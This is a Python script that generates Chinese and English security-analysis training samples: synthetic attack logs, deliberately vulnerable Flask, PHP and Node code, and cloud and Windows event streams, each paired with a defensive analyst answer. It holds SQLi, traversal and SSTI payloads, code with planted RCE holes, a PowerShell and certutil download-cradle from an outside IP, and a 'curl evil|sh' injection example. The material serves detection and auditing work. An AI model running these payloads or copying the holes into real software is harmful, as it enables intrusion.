#!/usr/bin/env python3
"""生成中长上下文校准样本（真实形态的日志/代码/事件流 + 手写分析）。

首版手写种子偏短（p50≈90 token），缺中长序列激活分布。本脚本用可复现的
真实结构内容（nginx/sshd 日志、代码文件、k8s/EDR JSON 事件）补齐 256-1536
token 区间的样本，target 为真实分析结论而非模板。

输出: data/seeds_long.jsonl （与 seeds.jsonl 合并后一起进 build_calib.py）
"""
import json
import os
import random

OUT = os.environ.get("BIMO_ROOT", "/home/dev/ljh/bimo") + "/data/seeds_long.jsonl"

NGINX_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
    "sqlmap/1.8.2#stable (https://sqlmap.org)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "python-requests/2.31.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0 Safari/537.36",
    "curl/8.4.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

PATHS_BENIGN = [
    "/", "/index.html", "/static/app.js", "/static/style.css", "/api/v1/status",
    "/images/logo.png", "/favicon.ico", "/login", "/dashboard", "/api/v1/orders",
    "/healthz", "/static/fonts/inter.woff2", "/api/v1/users/me",
]

ATTACK_SETS = {
    "sqli": [
        "/product?id=1%27%20OR%20%271%27%3D%271",
        "/product?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
        "/search?q=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--",
        "/api/v1/orders?id=1%20AND%20SLEEP(5)",
        "/login?user=admin%27--&pass=x",
    ],
    "traversal": [
        "/download?file=../../../../etc/passwd",
        "/static/..%2f..%2f..%2fetc%2fshadow",
        "/download?file=....//....//etc/hosts",
        "/files/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa",
    ],
    "scan": [
        "/admin.php", "/wp-login.php", "/.env", "/.git/config", "/phpmyadmin/",
        "/server-status", "/actuator/env", "/console", "/manager/html", "/cgi-bin/luci",
        "/.aws/credentials", "/backup.zip", "/db.sql", "/config.json",
    ],
    "webshell": [
        "/upload", "/upload", "/upload", "/shell.php", "/uploads/shell.php?cmd=id",
        "/uploads/x.jsp?cmd=whoami", "/uploads/shell.php?cmd=cat+/etc/passwd",
    ],
    "xss_probe": [
        "/comment?t=%3Cscript%3Ealert(1)%3C/script%3E",
        "/search?q=%22%3E%3Csvg%20onload%3Dalert(1)%3E",
        "/profile?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    ],
    "ssti": [
        "/?name=%7B%7B7*7%7D%7D",
        "/?name=%7B%7Bconfig%7D%7D",
        "/?name=%7B%7B''.__class__.__mro__%7D%7D",
        "/?name=%7B%7Blipsum.__globals__%7D%7D",
    ],
    "lfi": [
        "/page?f=php://filter/convert.base64-encode/resource=index.php",
        "/page?f=/etc/passwd%00",
        "/render?tpl=../../../../etc/passwd",
    ],
}


def gen_nginx(n_lines, attack, seed, src_ip="203.0.113.77"):
    """生成 nginx combined 格式日志，在末尾附近插入攻击突发段。"""
    rnd = random.Random(seed)
    lines = []
    hour = 2
    minute = 10
    second = 0
    n_benign = n_lines - len(ATTACK_SETS[attack]) * 2
    for i in range(n_benign):
        second += rnd.randint(0, 4)
        if second >= 60:
            second -= 60
            minute += 1
        if minute >= 60:
            minute -= 60
            hour += 1
        ip = src_ip if rnd.random() < 0.05 else f"10.0.{rnd.randint(1,6)}.{rnd.randint(2,250)}"
        path = rnd.choice(PATHS_BENIGN)
        code = rnd.choice([200, 200, 200, 200, 304, 302, 404, 500])
        size = rnd.randint(180, 42000) if code == 200 else rnd.randint(0, 500)
        ua = rnd.choice(NGINX_UA[:2] + NGINX_UA[5:6] + NGINX_UA[7:8])
        lines.append(
            f'{ip} - - [12/Nov/2026:{hour:02d}:{minute:02d}:{second:02d} +0000] '
            f'"GET {path} HTTP/1.1" {code} {size} "-" "{ua}"'
        )
    # 攻击突发
    for payload in ATTACK_SETS[attack]:
        second += 1
        lines.append(
            f'{src_ip} - - [12/Nov/2026:{hour:02d}:{minute:02d}:{second:02d} +0000] '
            f'"GET {payload} HTTP/1.1" 200 4211 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"'
        )
    return "\n".join(lines)


AUTH_USERS = ["root", "admin", "test", "oracle", "postgres", "ubuntu", "deploy", "git", "jenkins", "backup"]


def gen_authlog(n_lines, mode, seed):
    """生成 sshd 日志。mode: brute / lateral / normal"""
    rnd = random.Random(seed)
    lines = []
    h, m, s = 3, 12, 0
    if mode == "brute":
        attacker = "185.220.101.44"
        for i in range(n_lines):
            s += rnd.randint(0, 2)
            if s >= 60:
                s -= 60
                m += 1
            user = rnd.choice(AUTH_USERS)
            lines.append(
                f"Nov 12 {h:02d}:{m:02d}:{s:02d} srv sshd[{2000+i}]: "
                f"Failed password for {'invalid user ' if user in ('test','oracle') else ''}{user} "
                f"from {attacker} port {50000+i*7} ssh2"
            )
    elif mode == "lateral":
        acct = "svc_backup"
        hosts = ["10.20.7.88", "10.20.7.88", "10.20.9.14", "10.20.9.31"]
        for i in range(n_lines):
            s += rnd.randint(3, 40)
            if s >= 60:
                s -= 60
                m += 1
            src = rnd.choice(hosts) if i > 3 else "10.20.3.9"
            kind = rnd.choice([
                f"Accepted password for {acct} from {src} port {51000+i} ssh2",
                f"Accepted publickey for deploy from 10.20.3.9 port {40000+i} ssh2",
                f"session opened for user {acct} by (uid=0)",
                f"pam_unix(sshd:session): session closed for user {acct}",
            ])
            lines.append(f"Nov 12 {h:02d}:{m:02d}:{s:02d} srv sshd[{2000+i}]: {kind}")
    else:
        for i in range(n_lines):
            s += rnd.randint(5, 45)
            if s >= 60:
                s -= 60
                m += 1
            lines.append(
                f"Nov 12 {h:02d}:{m:02d}:{s:02d} srv sshd[{2000+i}]: "
                f"Accepted publickey for deploy from 10.20.3.9 port {40000+i} ssh2"
            )
    return "\n".join(lines)


CODE_PY = '''#!/usr/bin/env python3
"""Internal file service - DO NOT DEPLOY WITHOUT REVIEW."""
import os
import pickle
import random
import sqlite3
import subprocess

from flask import Flask, request, jsonify, send_file, render_template_string

app = Flask(__name__)
DB = "/srv/app/data.db"


def q(sql, args=()):
    con = sqlite3.connect(DB)
    return con.execute(sql, args).fetchall()


@app.route("/login", methods=["POST"])
def login():
    user = request.form["user"]
    pw = request.form["pw"]
    row = q("SELECT id, pw FROM users WHERE name = '%s'" % user)
    if row and row[0][1] == pw:
        return jsonify({"ok": True, "uid": row[0][0]})
    return jsonify({"ok": False}), 401


@app.route("/user/<uid>")
def get_user(uid):
    rows = q("SELECT * FROM users WHERE id = " + uid)
    return jsonify(rows)


@app.route("/download")
def download():
    name = request.args.get("file")
    path = os.path.join("/srv/app/files", name)
    return send_file(path)


@app.route("/ping")
def ping():
    host = request.args.get("host", "127.0.0.1")
    out = subprocess.check_output("ping -c 1 " + host, shell=True)
    return out.decode()


@app.route("/import", methods=["POST"])
def do_import():
    blob = request.files["blob"].read()
    obj = pickle.loads(blob)
    return jsonify({"restored": len(obj)})


@app.route("/render")
def render():
    t = request.args.get("t", "hello")
    return render_template_string("<h2>" + t + "</h2>")


@app.route("/reset/<uid>")
def reset(uid):
    token = "".join(random.choice("0123456789abcdef") for _ in range(24))
    q("UPDATE users SET token = ? WHERE id = ?", (token, uid))
    return jsonify({"token": token})


@app.route("/exec")
def run_cmd():
    cmd = request.args.get("c")
    os.system(cmd)
    return "done"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
'''

CODE_PHP = '''<?php
// legacy customer portal - migrated from 2013 codebase
require_once 'config.php';

$action = $_GET['action'] ?? 'home';

function db() {
    global $dbhost, $dbuser, $dbpass, $dbname;
    return new mysqli($dbhost, $dbuser, $dbpass, $dbname);
}

if ($action === 'login') {
    $u = $_POST['username'];
    $p = $_POST['password'];
    $m = db();
    $res = $m->query("SELECT * FROM accounts WHERE username = '$u' AND password = '$p'");
    if ($res && $res->num_rows > 0) {
        $_SESSION['uid'] = $res->fetch_assoc()['id'];
        header('Location: /portal.php?action=dashboard');
        exit;
    }
    echo "<p>Login failed</p>";
}

if ($action === 'upload') {
    $target = 'uploads/' . $_FILES['f']['name'];
    move_uploaded_file($_FILES['f']['tmp_name'], $target);
    echo "uploaded to $target";
}

if ($action === 'view') {
    $page = $_GET['p'];
    include($page . '.php');
}

if ($action === 'export') {
    $id = $_GET['id'];
    $m = db();
    $row = $m->query("SELECT * FROM invoices WHERE id = $id")->fetch_assoc();
    header('Content-Type: text/csv');
    echo $row['body'];
}

if ($action === 'admin') {
    if (isset($_COOKIE['is_admin']) && $_COOKIE['is_admin'] == '1') {
        echo "<h1>Admin panel</h1>";
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
}
'''

CODE_JS = '''// payment service - node 18 / express 4
const express = require('express');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const { exec } = require('child_process');
const axios = require('axios');

const app = express();
const SECRET = process.env.JWT_SECRET || 'dev-secret-2024';
const UPLOADS = path.join(__dirname, 'uploads');

app.use(express.json());

app.post('/api/login', async (req, res) => {
  const { user, pass } = req.body;
  const rows = await db.query(`SELECT * FROM users WHERE name='${user}' AND pw='${pass}'`);
  if (!rows.length) return res.status(401).json({ error: 'bad creds' });
  const token = jwt.sign({ uid: rows[0].id, role: rows[0].role }, SECRET);
  res.json({ token });
});

app.get('/api/me', (req, res) => {
  const payload = jwt.decode(req.headers.authorization.split(' ')[1]);
  res.json(payload);
});

app.get('/api/invoice/:id', async (req, res) => {
  const r = await db.query('SELECT * FROM invoices WHERE id = ' + req.params.id);
  res.json(r);
});

app.get('/api/file', (req, res) => {
  const p = path.join(UPLOADS, req.query.name);
  fs.readFile(p, (e, d) => {
    if (e) return res.status(500).send(e.message);
    res.send(d);
  });
});

app.post('/api/fetch', async (req, res) => {
  const r = await axios.get(req.body.url);
  res.json({ status: r.status, data: r.data });
});

app.post('/api/convert', (req, res) => {
  exec(`ffmpeg -i ${req.body.src} -c copy ${req.body.dst}`, (e, out) => {
    res.json({ ok: !e, out });
  });
});

app.post('/api/register', async (req, res) => {
  const { user, pass, role } = req.body;
  await db.query('INSERT INTO users SET ?', { name: user, pw: pass, role });
  res.json({ ok: true });
});

app.listen(3000, '0.0.0.0');
'''

K8S_EVENTS = [
    '{"verb":"get","user":"system:serviceaccount:prod:web","resource":"pods","ns":"prod","code":200}',
    '{"verb":"create","user":"system:serviceaccount:prod:web","resource":"pods/exec","ns":"prod","code":201}',
    '{"verb":"get","user":"system:serviceaccount:prod:web","resource":"secrets","ns":"prod","code":200}',
    '{"verb":"list","user":"system:serviceaccount:prod:web","resource":"secrets","ns":"kube-system","code":403}',
    '{"verb":"create","user":"system:serviceaccount:prod:web","resource":"clusterrolebindings","ns":"","code":403}',
    '{"verb":"patch","user":"admin@corp.com","resource":"deployments","ns":"prod","code":200}',
    '{"verb":"delete","user":"system:serviceaccount:prod:web","resource":"pods","ns":"prod","code":200}',
    '{"verb":"create","user":"system:serviceaccount:prod:web","resource":"pods","ns":"default","code":201}',
]

WIN_EVENTS = [
    "4688 New Process: Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=\"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAJA\"",
    "4104 ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.12/stage2')",
    "4688 New Process: Image=C:\\Windows\\System32\\rundll32.exe CommandLine=\"rundll32.exe C:\\Users\\Public\\a.dll,Start\"",
    "4698 Scheduled Task Created: TaskName=Updater Path=C:\\Users\\Public\\a.dll",
    "4624 Logon Type 3: TargetUser=administrator SourceIP=10.20.4.21 AuthPackage=NTLM",
    "4672 Special privileges assigned: SubjectUser=administrator SeDebugPrivilege",
    "5156 Connection Allowed: SrcIP=10.20.4.21 DstIP=45.9.148.12 DstPort=443",
    "4688 New Process: Image=C:\\Windows\\System32\\certutil.exe CommandLine=\"certutil -urlcache -f http://45.9.148.12/b.bin C:\\Users\\Public\\b.bin\"",
]


def gen_k8s(n, seed):
    rnd = random.Random(seed)
    return "\n".join(rnd.choice(K8S_EVENTS) for _ in range(n))


def gen_win(n, seed):
    rnd = random.Random(seed)
    return "\n".join(rnd.choice(WIN_EVENTS) for _ in range(n))


SAMPLES = []


def add(domain, system, user, assistant):
    d = {"domain": domain, "user": user, "assistant": assistant}
    if system:
        d["system"] = system
    SAMPLES.append(d)


# ---------------- 长上下文：nginx 日志族 ----------------
add("D", None,
    "下面是我们电商站点 12 日凌晨的 nginx 访问日志片段，请判断是否存在攻击行为、属于什么类型、以及有没有成功迹象。\n```\n" + gen_nginx(14, "sqli", 11) + "\n```",
    "存在明确的 SQL 注入扫描，且判定为「探测未成功」。依据：\n1) 同一源 IP 203.0.113.77 在极短时间内连续请求 `/product?id=1' OR '1'='1`、`UNION SELECT username,password FROM users--`、`WAITFOR DELAY`、`SLEEP(5)`，这是 sqlmap 的典型载荷序列（UA 也直接暴露为 sqlmap/1.8.2）；\n2) 载荷覆盖了布尔盲注、联合查询、时间盲注三类，说明攻击者在自动识别注入类型；\n3) 全部请求返回 200 且响应体大小一致（4211 字节），说明请求被 WAF 或应用重写为统一错误页/首页——如果是真正的 UNION 注入成功，响应体大小会随数据量变化，时间盲注成功则会出现 5 秒以上的响应时间偏移，日志里没有体现。\n建议：提取该 IP 完整会话确认是否有 200 且响应体异常的变异载荷；检查 `/product` 与 `/api/v1/orders` 的参数化查询实现；在 WAF 上固化 sqlmap UA 与上述载荷指纹，并对时间盲注类请求做响应时长告警。")

add("D", None,
    "分析这份 Web 日志，重点看文件读取类攻击和最终的落地结果。\n```\n" + gen_nginx(14, "traversal", 23, "198.51.100.9") + "\n```",
    "日志里存在目录穿越（path traversal）尝试，且末尾出现了落地文件的访问，风险等级高。\n特征：源 198.51.100.9 依次尝试 `/download?file=../../../../etc/passwd`、双重编码变体 `..%2f..%2f..%2fetc%2fshadow`、绕过型 `....//....//`、以及针对 `~/.ssh/id_rsa` 的定向读取，四种绕过手法齐上，说明在试探过滤规则。\n关键点：日志末尾出现 `/uploads/shell.php?cmd=id` 和 `/uploads/x.jsp?cmd=whoami` 且返回 200，这不再是读取尝试而是 Web Shell 交互——说明攻击链已经从「读文件」推进到「写文件并执行」。响应体 4211 字节与正常页不同，需要立刻拉取该响应内容确认命令回显。\n处置：隔离主机、封禁该 IP、检查 /uploads 目录下近期新增文件（按 mtime 排序）、确认 uploads 目录是否配置了 PHP 解析（这是能执行的根本原因）、回溯该 IP 是否通过上传接口投递了 shell。")

add("D", None,
    "这是同一 IP 对多个路径的连续请求，判断攻击阶段。\n```\n" + gen_nginx(14, "scan", 37, "45.155.205.233") + "\n```",
    "这是典型的目录/敏感文件扫描阶段（recon），尚未看到利用成功。\n依据：45.155.205.233 在短时间内请求 `.env`、`.git/config`、`.aws/credentials`、`backup.zip`、`db.sql`、`phpmyadmin/`、`server-status`、`actuator/env`、`manager/html`、`cgi-bin/luci` 等十余个高价值路径，覆盖面横跨配置泄漏、备份文件、管理后台、框架端点，是自动化扫描器（如 nuclei/gobuster 的字典）行为，而非人工浏览。\n判定未成功的关键：需要看这些请求的状态码。若 `.env`/`.git/config` 返回 200 且响应体不为首页，则等同于凭据泄漏，必须立即按失陷处理；若统一 404 或跳到首页（软 404），则只是探测。\n建议：确认 `.git`、`.env`、备份文件不在 Web 根目录；`actuator` 生产只暴露 health；封禁该 IP 并对同网段做相同路径的批量排查。")

add("D", None,
    "这段日志里出现了多次 200，但我不确定是不是成功入侵，帮我判断。\n```\n" + gen_nginx(14, "webshell", 41, "91.240.118.172") + "\n```",
    "高度疑似 Web Shell 上传并执行成功，建议按已失陷处置。\n判断依据：91.240.118.172 先多次 POST/GET 到 `/upload`，随后直接访问 `/shell.php`，紧接着出现带 `?cmd=id`、`?cmd=whoami`、`?cmd=cat+/etc/passwd` 的交互式请求且返回 200——这种「上传后立即用 cmd 参数调用」的模式几乎没有合法业务场景。\n但仅凭日志不能百分百确认执行成功：需要拉取 `/shell.php?cmd=id` 那次请求的响应体，若包含 `uid=` 输出即为铁证；同时检查 `/upload` 的代码是否校验扩展名与内容类型、上传目录是否允许脚本执行。\n处置：隔离主机、保存磁盘与内存镜像、封禁 IP、按 webshell 特征（如中国菜刀/冰蝎的固定请求头与加密体）全盘扫描同类文件，并排查该主机持有的所有凭据。")

add("D", None,
    "这段日志里的 7*7 之类请求是什么？请判断是否已被利用。\n```\n" + gen_nginx(14, "ssti", 53, "10.0.5.31") + "\n```",
    "这是服务端模板注入（SSTI）的探测序列。`{{7*7}}` 用于验证模板引擎是否执行表达式（若返回 49 即确认），`{{config}}` 用于读取应用配置，`{{''.__class__.__mro__}}` 是构造对象链进一步找 os 模块的前置步骤——三者连用是 Jinja2 SSTI 的标准探测路径。\n是否已利用：需要看响应。若 `{{7*7}}` 的响应体里出现 `49`，说明模板被执行，属已确认漏洞；若三者都返回统一错误页（如 4211 字节的同一页面），则尚未打通。日志里响应体大小一致，倾向「探测未成功」，但必须人工回看响应内容才能定论。\n另外注意源 IP 10.0.5.31 属内网，可能是被控主机在横向，需一并排查。修复：模板变量走上下文传参而非字符串拼接，开启 autoescape，禁止用户输入进入模板源码。")

add("D", None,
    "请把这份日志归纳成一条完整的攻击链，并说明每个阶段对应哪几条请求。\n```\n" + gen_nginx(14, "lfi", 67, "103.94.108.5") + "\n```",
    "可以归纳为「探测 → 本地文件包含 → 敏感文件读取」三阶段，尚未见代码执行。\n阶段一（探测）：源 103.94.108.5 先对 `/page?f=` 做 php://filter 包装器尝试 `php://filter/convert.base64-encode/resource=index.php`，目的是在不触发解析的前提下读取源码；同时试探 `/etc/passwd%00` 的空字节截断（老版本 PHP 有效）。\n阶段二（LFI 确认）：`/render?tpl=../../../../etc/passwd` 返回 200，若响应体含 `root:x:0:0` 则确认包含成功；这个参数名 tpl 说明后端把用户输入当模板路径，属于典型 LFI。\n阶段三（利用意图）：后续若出现 `?f=/var/log/auth.log` 或 `?f=/proc/self/environ`，则是在为日志投毒/环境变量注入做 RCE 铺垫；当前日志未见，说明攻击者只停留在读文件阶段。\n处置：修复文件包含（白名单映射 ID 到固定路径，禁止路径拼接）、禁用 allow_url_include、把 %00 截断依赖的旧 PHP 升级、并对该 IP 全量会话做源码泄漏评估（php://filter 读出源码等于泄漏数据库口令）。")

# ---------------- 长上下文：sshd 日志族 ----------------
add("D", None,
    "这是我们跳板机的 sshd 日志，判断威胁性质与可能的失陷范围。\n```\n" + gen_authlog(22, "brute", 7) + "\n```",
    "判定为针对 SSH 的字典爆破，且未成功（日志中无对应 Accepted 记录）。\n特征：185.220.101.44 在约一分钟内对 root/admin/test/oracle/postgres/ubuntu/deploy/git/jenkins/backup 等 10 个常见账号各尝试多次，端口号递增（50000 起每条约 +7），是脚本化爆破的典型形态；同时混入 invalid user 说明在使用用户名枚举字典。\n影响评估：全部为 Failed password，未见同一 IP 的 Accepted，说明爆破未得手；但需要确认三件事：1) 是否有其他源 IP 在同一时段成功登录（横向可能来自另一入口）；2) 这些账号是否存在弱口令（尤其 jenkins/backup 这类服务账号）；3) 该 IP 是否也尝试了其他端口（如 2222、数据库）。\n加固：仅允许密钥登录、禁用 root 直接登录、部署 fail2ban（阈值 5 次/10 分钟封禁）、把 SSH 暴露面收敛到堡垒机。")

add("D", None,
    "这份日志里同一服务账号出现在多台主机，请判断是否为横向移动。\n```\n" + gen_authlog(22, "lateral", 13) + "\n```",
    "高度疑似凭据复用导致的横向移动。\n判据：服务账号 svc_backup 在数分钟内从 10.20.7.88、10.20.9.14、10.20.9.31 三台不同内网主机以**口令方式**（Accepted password）登录成功，且 session opened by (uid=0) 说明登录后获得了 root 会话。服务账号通常应限定来源主机并使用密钥，跨三台且用口令是明显的异常。\n进一步推断：源主机 10.20.7.88 先出现（最早），很可能是首个被控节点，攻击者在其上抓到了 svc_backup 的明文口令（配置文件或内存），然后向 10.20.9.x 段扩散。\n需立即确认：1) svc_backup 的口令是否存放在某台主机的明文配置里（这是泄漏源）；2) 这三台上 svc_backup 登录后执行了什么（查 .bash_history 与 audit 日志）；3) 该账号的 sudo 权限范围。\n处置：轮换口令、改为密钥+限定来源、隔离 10.20.7.88 做取证、检查同网段其他主机是否有相同登录模式。")

# ---------------- 长上下文：代码审计族 ----------------
add("C", None,
    "请对这个 Flask 服务做一次完整的安全审计，按严重程度列出问题并给出修复方案。\n```python\n" + CODE_PY + "```",
    "共发现 7 处问题，按严重程度排列：\n\n【严重】1. `/import` 的 pickle 反序列化（RCE）。`pickle.loads` 直接处理上传内容，攻击者可构造 `__reduce__` 执行任意命令，且无认证。修复：改用 JSON；若必须传对象，用 pydantic 做 schema 校验并加 HMAC 校验来源。\n【严重】2. `/exec` 的 `os.system(cmd)`（RCE）。`cmd` 参数完全可控，等同远程命令执行。修复：删除该接口；若业务必需，改为固定的白名单动作映射，禁止拼接。\n【严重】3. `/render` 的 SSTI（RCE）。`render_template_string` 拼接用户输入，`{{config}}` 可直接读配置、`{{''.__class__}}` 可打通对象链执行命令。修复：改用 `render_template` + 变量传参。\n\n【高危】4. `/login` 的 SQL 注入。`% user` 字符串拼接，`admin'--` 即可绕过；且口令以明文比对（`row[0][1] == pw`），说明库里存的也是明文。修复：参数化查询 + Argon2/bcrypt 哈希 + 每用户盐。\n【高危】5. `/user/<uid>` 的 SQL 注入（`+ uid` 拼接）。修复：参数化并强制 int 转换。\n【高危】6. `/download` 路径穿越。`os.path.join` 不约束目录，`file=../../etc/passwd` 可读任意文件。修复：`realpath` 后校验前缀在 files 目录内，并只允许白名单文件名。\n\n【中危】7. `/ping` 命令注入 + `/reset/<uid>` 弱随机 token。前者 `shell=True` 拼接 host，`; id` 即注入，应改 `subprocess.run([...], shell=False)` 并校验 IP；后者用 `random`（Mersenne Twister，可预测），应改 `secrets.token_urlsafe`。\n\n另外 `app.run(debug=True, host=0.0.0.0)` 在生产会暴露 Werkzeug 调试器（可交互执行代码），必须关闭 debug。建议整体加认证中间件，并把这 7 条纳入 CI 的 semgrep 规则。")

add("C", None,
    "审计这份 PHP 遗留代码，指出可利用链并说明最危险的一条。\n```php\n" + CODE_PHP + "```",
    "共 6 处问题，其中 3 处可直接导致 RCE。\n\n【最危险】`?action=admin` + `shell_exec($_GET['cmd'])`：只要客户端把 Cookie `is_admin` 设为 1 就能进管理面板并执行任意命令。这是「信任客户端 Cookie 做权限判断」+「命令拼接」的叠加，攻击者无需任何凭据，一条 URL 即可 RCE（`Cookie: is_admin=1` + `?action=admin&cmd=id`）。修复：权限判断移到服务端会话，彻底移除 shell_exec。\n\n【RCE】`?action=view` 的 `include($page . '.php')`：本地文件包含，可 `?p=../../../../var/log/auth.log%00` 或结合日志投毒 / php://input 执行代码。修复：用数组白名单把 page 映射到固定模板。\n\n【RCE】`?action=upload`：`$_FILES['f']['name']` 未过滤直接拼路径，可传 `../../shell.php` 造成目录穿越写入，且能直接上传 .php。修复：`basename()` + 扩展名白名单 + 随机文件名 + 上传目录禁执行。\n\n【高危】`?action=login` 的 SQL 注入：`'$u' AND password='$p'` 双字段拼接，`admin'--` 直接绕过登录；且口令明文比对。修复：预处理语句 + password_hash/password_verify。\n【高危】`?action=export` 的 SQL 注入：`WHERE id = $id` 数字型注入，`0 UNION SELECT ...` 可拖库。修复：强制 intval + 预处理。\n【中危】`?action=admin` 还缺 CSRF 与审计日志。\n\n建议：这份代码不应继续承载业务，优先下线 admin/exec/view 三个入口，再按白名单方式重写。")

add("C", None,
    "review this Node service and list every vulnerability with a concrete fix.\n```javascript\n" + CODE_JS + "```",
    "8 issues, ordered by impact:\n\n1. [Critical] SQL injection in `/api/login` and `/api/invoice/:id` — template literals interpolate `user`, `pass`, and `req.params.id` straight into SQL. `' OR '1'='1' --` logs in as the first user; `0 UNION SELECT ...` dumps invoices. Fix: use parameterized queries (`db.query('... WHERE name = ?', [user])`), never string concatenation.\n\n2. [Critical] Auth bypass in `/api/me` — `jwt.decode` does not verify the signature, so anyone can forge `{role:'admin'}`. Fix: `jwt.verify(token, SECRET, {algorithms:['HS256']})` and reject on failure.\n\n3. [Critical] Hardcoded fallback secret `'dev-secret-2024'` — if `JWT_SECRET` is unset in prod, tokens are forgeable with a public string. Fix: fail fast at boot when the env var is missing; load from a secret manager and rotate.\n\n4. [High] Path traversal in `/api/file` — `path.join(UPLOADS, name)` normalizes `..`, so `?name=../../etc/passwd` escapes. Also leaks the absolute path via the error message. Fix: `path.resolve` + prefix check against `UPLOADS + path.sep`, return generic 400.\n\n5. [High] SSRF in `/api/fetch` — arbitrary URL fetch can reach `169.254.169.254` for cloud metadata or internal admin panels. Fix: allowlist schemes/hosts, resolve DNS and reject private ranges, disable redirects or re-validate each hop.\n\n6. [High] Command injection in `/api/convert` — `exec` with interpolated `src`/`dst`: `src=; curl evil|sh;` executes. Fix: `execFile('ffmpeg', ['-i', src, '-c', 'copy', dst])` with no shell, plus path validation.\n\n7. [High] Privilege escalation in `/api/register` — `role` is taken from the request body, so anyone can self-register as admin. Fix: force `role='user'` server-side; grant roles only through an admin-only endpoint.\n\n8. [Medium] Passwords stored raw and compared in SQL (`pw='${pass}'`) — no hashing, and the comparison leaks via SQLi. Fix: bcrypt/argon2 hash on write, constant-time verify in app code.\n\nAlso: `SECRET` has no expiry on tokens (add `expiresIn`), and there is no rate limiting on `/api/login`. Fix 1-3 before anything else — they are each independently sufficient for full compromise.")

# ---------------- 长上下文：云原生 / Windows 事件族 ----------------
add("D", None,
    "分析这份 K8s audit 事件流，判断是否有容器逃逸或凭据滥用。\n```\n" + gen_k8s(40, 19) + "\n```",
    "存在明确的凭据滥用与越权尝试，容器逃逸未完成但已具备条件。\n关键链条：`system:serviceaccount:prod:web` 这个业务负载的服务账号先 `create pods/exec`（201，成功进入容器），随后 `get secrets`（200，读到 prod 命名空间全部密钥），再尝试 `list secrets -n kube-system`（403）和 `create clusterrolebindings`（403）——这是拿到 SA token 后的标准扩权路径：先读本命名空间密钥，再试探跨命名空间与集群级权限。\n两次 403 说明 RBAC 拦住了横向，但 prod 的 secrets 已泄漏（含数据库口令、镜像仓库凭据），必须按泄漏处置。\n另外 `create pods -n default`（201）说明该 SA 还能在 default 建 Pod，可用于挂载 hostPath 实现逃逸，这是下一步最可能的动作。\n处置：吊销该 SA token、把 `prod:web` 的 RBAC 收紧到只读自身 ConfigMap、禁用 exec、启用 PodSecurity admission 禁止 hostPath 与 privileged、审计该 Deployment 镜像是否被篡改（exec 入口通常来自 RCE 或恶意镜像）。")

add("D", None,
    "这段 Windows 事件日志描述了什么攻击？请还原步骤并给出 IOC。\n```\n" + gen_win(38, 29) + "\n```",
    "这是一条完整的「无文件落地 → 持久化 → 横向」链，属 APT 常见手法。\n还原步骤：\n1) 初始执行：powershell.exe 带 `-nop -w hidden -enc`（Base64 编码命令），规避命令行审计与窗口暴露；\n2) 内存加载：4104 还原出 `IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.12/stage2')`，从远程拉取并内存执行，磁盘无文件；\n3) 载荷落地：rundll32 加载 `C:\\Users\\Public\\a.dll,Start`——Public 目录可写且不常被监控，是常见的载荷藏匿点；\n4) 持久化：4698 创建计划任务 `Updater` 指向该 DLL；\n5) 凭据与横向：4624 Type 3 NTLM 从 10.20.4.21 以 administrator 登录，随后 4672 授予 SeDebugPrivilege，具备抓取 LSASS 的条件；\n6) 外联与二次下载：5156 放行到 45.9.148.12:443，certutil 从同一下载 `b.bin`（certutil 常被滥用作下载器）。\nIOC：IP 45.9.148.12；URL 路径 /stage2、/b.bin；文件 C:\\Users\\Public\\a.dll、b.bin；计划任务名 Updater；父进程链 powershell → rundll32。\n处置：隔离 10.20.4.21 与受害主机、封 IP、删除计划任务、按 IOC 全网扫描、重置 administrator 口令并检查是否已 DCSync。")

# ---------------- 中长：内网协议与合规类 ----------------
add("E", None,
    "我们在授权范围内做了一次内网评估，发现了下面这些情况。请按风险优先级排序并说明验证边界。\n1) 12 台 Windows 服务器 SMB 签名为 False\n2) 域内存在 3 个 2019 年创建的服务账号，口令 8 位且从未轮换\n3) 一台 DC 的 LDAP 未强制签名\n4) 内网存在 LLMNR 响应\n5) BloodHound 显示 4 条到 Domain Admin 的 3 跳路径\n6) 两台数据库主机 1433 对全网段开放\n请给出优先级与下一步最小验证动作。",
